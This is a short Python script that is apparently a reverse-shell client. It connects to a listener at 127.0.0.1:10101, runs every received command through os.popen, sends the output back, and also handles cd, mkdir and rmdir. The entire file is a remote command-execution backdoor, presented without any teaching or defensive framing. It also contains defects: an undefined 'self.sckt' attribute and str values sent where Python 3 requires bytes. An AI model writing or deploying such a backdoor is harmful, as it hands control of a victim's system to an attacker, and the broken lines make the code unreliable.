#!/usr/bin/env python

import os
import socket

class Client(object):
   
    def __init__(self):
        self.ip = "127.0.0.1"
        self.port = 10101
        self.socket = socket.socket()
        self.data_size = 4096
        self.data_format = "utf-8"

    def start(self):
        self.configure_socket()
        self.receive_commands()

    
    def configure_socket(self):
        self.socket.connect((self.ip, self.port))


    def receive_commands(self):
        while True:
            data = self.socket.recv(self.data_size)
            command = data.decode(self.data_format)
            if command == "?":
                self.socket.send("!")
            elif command[:2] == "cd":
                os.chdir(command[3:])
                self.socket.send(" ")
            elif command[:5] == "mkdir":
                os.mkdir(command[6:])
                self.socket.send(" ")
            elif command[:5] == "rmdir":
                os.rmdir(command[6:])
                self.sckt.send(" ")
            elif len(command) > 0:
                try:
                    process = os.popen(command)
                    output = str(process.read())
                    self.socket.send(output + " ")
                except OSError as message:
                    self.socket.send(str(message) + " ")
        self.socket.close()


Client().start()

